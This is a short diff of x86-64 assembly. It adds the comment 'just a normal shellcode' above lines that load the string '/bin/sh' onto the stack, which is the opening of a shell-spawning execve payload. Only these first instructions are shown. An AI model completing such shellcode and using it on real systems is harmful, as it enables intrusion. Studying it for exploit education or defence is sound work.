@@ -1,3 +1,4 @@
+; just a normal shellcode
 mov rdi, 0x0068732f6e69622f
 push rdi
 mov rdi, rsp
